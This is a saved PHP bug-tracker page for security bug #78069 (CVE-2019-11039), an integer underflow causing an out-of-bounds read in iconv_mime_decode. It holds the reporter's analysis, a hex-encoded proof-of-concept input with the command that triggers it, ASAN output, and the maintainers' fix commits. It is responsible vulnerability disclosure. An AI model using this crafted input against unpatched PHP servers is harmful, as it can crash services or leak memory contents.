@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='ICONV related Bug #78069 - RDF' href='rss/bug.php?id=78069'>
+        <link rel='alternate' type='application/rss+xml' title='ICONV related Bug #78069 - RSS 2.0' href='rss/bug.php?id=78069&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #78069 :: Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=78069">Sec Bug</a>&nbsp;#78069</th>
+            <td id="summary" colspan="5">Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2019-05-26 14:36 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2019-05-27 23:48 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>maris &#x64;&#111;&#x74; adam &#x61;&#116; gmail &#x64;&#111;&#x74; com</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=ICONV+related">ICONV related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>7.1.29</td>
+            <th class="details">OS:</th>
+            <td>Linux</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11039" target="_blank">2019-11039</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=78069&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=78069&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=78069&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1558881375">&nbsp;</a><strong>[2019-05-26 14:36 UTC] maris &#x64;&#111;&#x74; adam &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>Description:
+------------
+In _php_iconv_mime_decode() function in iconv.c, there's an out-of-bounds read due to an integer overflow vulnerability. MIME encoded string is being parsed and decoded in for loop with following condition:
+
+for (str_left = str_nbytes; str_left &gt; 0; str_left--, p1++) {
+
+Inside this for loop, it's possible for str_left to be decreased and p1 to be increased at the same time when scan_stat is equal to 2 (i.e. case 2 branch of the switch) and the given character set is unrecognized and ICONV_MIME_DECODE_CONTINUE_ON_ERROR is specified, so it continues to parse the message. It will then try to skip the encoded word by searching for the other two '?' characters while increasing p1 and decreasing str_left:
+
+int qmarks = 2;
+while (qmarks &gt; 0 &amp;&amp; str_left &gt; 1) {
+    if (*(++p1) == '?') {
+        --qmarks;
+    }
+    --str_left;
+}
+
+If the while condition is stopped, it will proceed to the next condition that checks if the next character is '=' and if it is, p1 is increased again and str_left is decreased: 
+
+if (*(p1 + 1) == '=') {
+    ++p1;
+    --str_left;
+}
+
+However, if the previous while loop was stopped due to str_left being equal to 1, it is now decreased to 0. The encoded string is copied to 'pretval' variable and if it doesn't error out, it will properly set scan_stat and break:
+
+scan_stat = 12;
+break;
+
+The for loop is being run from start again, but before checking the condition 'str_left &gt; 0', it is first decreased. Since it was already equal to 0 and it is defined as size_t (i.e. unsigned integer), it will overflow to very huge positive number. At this point, the code will continue to read from p1 out of bounds and copy it to 'pretval'.
+
+The exact behaviour depends on the content of the memory after 'str' buffer. Possible impact is crash of the application or even information leak, depending on the further usage of the decoded header since it contains the data from memory outside of allocated string.
+
+This issue affects all current stable releases, namely PHP-7.1.29, PHP-7.2.18, and PHP-7.3.5. Tested on Fedora 28, PHP code was compiled with ASAN. It is possible to observe the bug also with valgrind without the necessity of compilig php with ASAN.
+
+Test script:
+---------------
+$ echo &quot;53754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f69730d0d0d0d0d0d0d0d0d0d0d0d0d0d0d6563743a203d3f6973754c743b2020304a70616100000d0d0d0d0d0d0d0d0d6563743a203d3f6f2d383835392d313f713f3c334633463d33463f3da2&quot; | xxd -r -p - &gt; poc
+
+$ sha256sum poc
+c471fb3e1511897d3fda9095e0eb85c934532a207f30ac99f0e7d58c42916e4b  poc
+
+$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents(&quot;poc&quot;),2);'
+
+Expected result:
+----------------
+No out-of-bounds read, i.e. the message is properly parsed.
+
+The attached proposed patch will not decrease 'str_left' if it's not greater then 1. While it will increase p1 since it's needed for copying the content into 'pretval', it will then break out of switch, decrease automatically and for loop will not continue since 'str_left' is equal to 0.
+
+Actual result:
+--------------
+$ USE_ZEND_ALLOC=0 sapi/cli/php -r '$hdr = iconv_mime_decode_headers(file_get_contents(&quot;poc&quot;),2);'
+=================================================================
+==26444==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60d0000005a8 at pc 0x000000a2ee39 bp 0x7ffcc313a470 sp 0x7ffcc313a460
+READ of size 1 at 0x60d0000005a8 thread T0
+    #0 0xa2ee38 in _php_iconv_mime_decode /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965
+    #1 0xa332c6 in zif_iconv_mime_decode_headers /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:2409
+    #2 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690
+    #3 0x159adb7 in execute_ex /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:55465
+    #4 0x15dc2cc in zend_execute /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:60881
+    #5 0x1134723 in zend_eval_stringl /home/neural.x/Projects/php-7.3.5/Zend/zend_execute_API.c:1018
+    #6 0x1134ec9 in zend_eval_stringl_ex /home/neural.x/Projects/php-7.3.5/Zend/zend_execute_API.c:1059
+    #7 0x1134f7a in zend_eval_string_ex /home/neural.x/Projects/php-7.3.5/Zend/zend_execute_API.c:1070
+    #8 0x15e4c80 in do_cli /home/neural.x/Projects/php-7.3.5/sapi/cli/php_cli.c:1028
+    #9 0x15e7191 in main /home/neural.x/Projects/php-7.3.5/sapi/cli/php_cli.c:1389
+    #10 0x7f66b910311a in __libc_start_main (/lib64/libc.so.6+0x2311a)
+    #11 0x427619 in _start (/home/neural.x/Projects/php-7.3.5/sapi/cli/php+0x427619)
+
+0x60d0000005a8 is located 0 bytes to the right of 136-byte region [0x60d000000520,0x60d0000005a8)
+allocated by thread T0 here:
+    #0 0x7f66ba937448 in __interceptor_realloc (/lib64/libasan.so.5+0xef448)
+    #1 0x10ccc66 in __zend_realloc /home/neural.x/Projects/php-7.3.5/Zend/zend_alloc.c:2922
+    #2 0x10c6ca9 in _erealloc /home/neural.x/Projects/php-7.3.5/Zend/zend_alloc.c:2525
+    #3 0x102ba2b in zend_string_truncate /home/neural.x/Projects/php-7.3.5/Zend/zend_string.h:225
+    #4 0x102ba2b in _php_stream_copy_to_mem /home/neural.x/Projects/php-7.3.5/main/streams/streams.c:1451
+    #5 0xd96688 in zif_file_get_contents /home/neural.x/Projects/php-7.3.5/ext/standard/file.c:569
+    #6 0xae0c58 in phar_file_get_contents /home/neural.x/Projects/php-7.3.5/ext/phar/func_interceptors.c:222
+    #7 0x159adb7 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:690
+    #8 0x159adb7 in execute_ex /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:55465
+    #9 0x15dc2cc in zend_execute /home/neural.x/Projects/php-7.3.5/Zend/zend_vm_execute.h:60881
+    #10 0x1134723 in zend_eval_stringl /home/neural.x/Projects/php-7.3.5/Zend/zend_execute_API.c:1018
+    #11 0x1134ec9 in zend_eval_stringl_ex /home/neural.x/Projects/php-7.3.5/Zend/zend_execute_API.c:1059
+    #12 0x1134f7a in zend_eval_string_ex /home/neural.x/Projects/php-7.3.5/Zend/zend_execute_API.c:1070
+    #13 0x15e4c80 in do_cli /home/neural.x/Projects/php-7.3.5/sapi/cli/php_cli.c:1028
+    #14 0x15e7191 in main /home/neural.x/Projects/php-7.3.5/sapi/cli/php_cli.c:1389
+    #15 0x7f66b910311a in __libc_start_main (/lib64/libc.so.6+0x2311a)
+
+SUMMARY: AddressSanitizer: heap-buffer-overflow /home/neural.x/Projects/php-7.3.5/ext/iconv/iconv.c:1965 in _php_iconv_mime_decode
+Shadow bytes around the buggy address:
+  0x0c1a7fff8060: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
+  0x0c1a7fff8070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0c1a7fff8080: 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00
+  0x0c1a7fff8090: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
+  0x0c1a7fff80a0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
+=&gt;0x0c1a7fff80b0: 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa
+  0x0c1a7fff80c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c1a7fff80d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c1a7fff80e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c1a7fff80f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c1a7fff8100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==26444==ABORTING
+
+</pre>
+</div><h2>Patches</h2>
+<a href="patch-display.php?bug_id=78069&amp;patch=iconv_patch.diff&amp;revision=latest" >iconv_patch.diff</a>
+(last revision 2019-05-26 14:36 UTC by maris &#x64;&#111;&#x74; adam &#x61;&#116; gmail &#x64;&#111;&#x74; com)
+<br><p><a href='patch-add.php?bug_id=78069'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=78069'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1558906950">&nbsp;</a><strong>[2019-05-26 21:42 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Verified</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1558906950">&nbsp;</a><strong>[2019-05-26 21:42 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Thanks for reporting this issue, the fine analysis and the good
+patch!
+
+Stas, could you please handle this for the upcoming GA releases?
+</pre>
+</div><div class='comment type_log' ><a name="1558999014">&nbsp;</a><strong>[2019-05-27 23:16 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2019-11039</span>
+</div></div></div><div class='comment type_log' ><a name="1559000929">&nbsp;</a><strong>[2019-05-27 23:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-PHP Version: 7.3.5</span>
+<span class="added">+PHP Version: 7.1.29</span>
+</div></div></div><div class='comment type_svn' ><a name="1559000941">&nbsp;</a><strong>[2019-05-27 23:49 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7cf7148a8f8f4f55fb04de2a517d740bb6253eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7cf7148a8f8f4f55fb04de2a517d740bb6253eac</a>
+Log: Fix <a href='bug.php?id=78069'>bug #78069</a> - Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow
+</pre>
+</div><div class='comment type_log' ><a name="1559000941">&nbsp;</a><strong>[2019-05-27 23:49 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Verified</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1559000987">&nbsp;</a><strong>[2019-05-27 23:49 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=7cf7148a8f8f4f55fb04de2a517d740bb6253eac" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=7cf7148a8f8f4f55fb04de2a517d740bb6253eac</a>
+Log: Fix <a href='bug.php?id=78069'>bug #78069</a> - Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow
+</pre>
+</div><div class='comment type_svn' ><a name="1559027278">&nbsp;</a><strong>[2019-05-28 07:07 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=70523ce41ff400ea00343a03f297332cb1f1b77b" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=70523ce41ff400ea00343a03f297332cb1f1b77b</a>
+Log: Fix <a href='bug.php?id=78069'>bug #78069</a> - Out-of-bounds read in iconv.c:_php_iconv_mime_decode() due to integer overflow
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
